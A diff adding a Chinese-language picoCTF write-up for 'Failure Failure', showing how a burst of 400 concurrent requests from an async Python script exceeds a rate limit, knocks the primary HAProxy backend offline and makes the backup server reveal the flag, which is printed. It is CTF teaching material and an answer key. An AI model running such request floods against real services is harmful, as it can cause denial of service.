@@ -1,0 +1,120 @@
+---
+title: 'Failure Failure'
+description: ''
+pubDate: '2026-04-28T14:00:00Z'
+tags: ['picoCTF', 'General Skills']
+category: 'WriteUp'
+---
+
+- 分類：General Skills
+- 難度：Medium
+- 題目連結：https://play.picoctf.org/practice/challenge/756
+
+### 工具
+
+- [Python](https://www.python.org/)
+
+### 過程
+
+1. 從題目敘述中，可推論應該是負載平衡的配置。
+2. 題目給了 `app.py` 檔（後端伺服器），並且發現了最可疑的速率限制每分鐘 300 次請求。
+
+```py
+# Initialize rate limiter with global key function
+limiter = Limiter(
+    key_func=global_rate_limit_key,
+    app=app,
+    default_limits=["300 per minute"]
+)
+```
+
+3. 並且給了 `haproxy.cfg` 負載平衡的配置檔。這裡可以看到 `check backup`，代表 s2 會在 s1 掛掉時接手。
+
+```cfg
+backend servers
+    option httpchk GET /
+    http-check expect status 200
+    server s1 *:8000 check inter 2s fall 2 rise 3
+    server s2 *:9000 check backup inter 2s fall 2 rise 3
+```
+
+4. 回頭看看 `app.py`，通靈猜測一下 `IS_BACKUP` 應該就是 backup server 會有的環境變數，那麼目標很明確了：**就是快速請求超過每分鐘 300 次，讓 s1 崩潰，進而讓 s2 接手，取得 flag**。
+
+```py
+@app.route('/')
+@limiter.limit("300 per minute")
+def home():
+    print("value:", os.getenv("IS_BACKUP"))
+    if os.getenv("IS_BACKUP") == "yes":
+        flag = os.getenv("FLAG")
+    else:
+        flag = "No flag in this service"
+    return render_template("index.html", flag=flag)
+```
+
+5. 寫 Python 腳本（AI 協助）。簡單看一下就是使用非同步套件，以及請求套件，並使用正則表達式來抓取 flag。這裡我修改到 400 請求，讓它確定 s1 崩潰。
+
+```py
+import asyncio
+import aiohttp
+import re
+
+# 目標 URL
+URL = 'target-url' 
+# 想要抓取的正則表達式 (例如 picoCTF 的 flag 格式)
+FLAG_PATTERN = r'picoCTF\{.*\}'
+
+async def fetch_and_find(session, i):
+    try:
+        async with session.get(URL, timeout=5) as response:
+            text = await response.text()
+            # 在網頁內容中搜尋特定句子或 Flag
+            found = re.findall(FLAG_PATTERN, text)
+            if found:
+                print(f"[+] 第 {i} 次請求找到目標: {found[0]}")
+                return found[0]
+            else:
+                if i % 50 == 0:
+                    print(f"[*] 已完成 {i} 次請求...")
+    except Exception as e:
+        pass
+    return None
+
+async def main(total_requests):
+    # 使用 ClientSession 維持連線池
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        for i in range(total_requests):
+            tasks.append(fetch_and_find(session, i))
+
+        # 同時執行所有任務
+        results = await asyncio.gather(*tasks)
+
+        # 篩選掉 None 的結果
+        final_flags = [f for f in results if f]
+        print(f"\n任務完成。共找到 {len(final_flags)} 個結果。")
+
+if __name__ == "__main__":
+    # 設定要在短時間內發送的總請求數
+    # 300 次請求在非同步架構下通常只需幾秒鐘
+    asyncio.run(main(400))
+```
+
+6. 會得到類似結果
+
+```
+[*] 已完成 0 次請求...
+[*] 已完成 50 次請求...
+[*] 已完成 100 次請求...
+[*] 已完成 150 次請求...
+[*] 已完成 200 次請求...
+[+] 第 254 次請求找到目標: picoCTF{f41l0v3r_f0r_7h3_w1n_28f14987}
+[+] 第 260 次請求找到目標: picoCTF{f41l0v3r_f0r_7h3_w1n_28f14987}
+[+] 第 266 次請求找到目標: picoCTF{f41l0v3r_f0r_7h3_w1n_28f14987}
+[+] 第 272 次請求找到目標: picoCTF{f41l0v3r_f0r_7h3_w1n_28f14987}
+[+] 第 278 次請求找到目標: picoCTF{f41l0v3r_f0r_7h3_w1n_28f14987}
+[+] 第 284 次請求找到目標: picoCTF{f41l0v3r_f0r_7h3_w1n_28f14987}
+[*] 已完成 400 次請求...
+
+任務完成。共找到 7 個結果。
+```
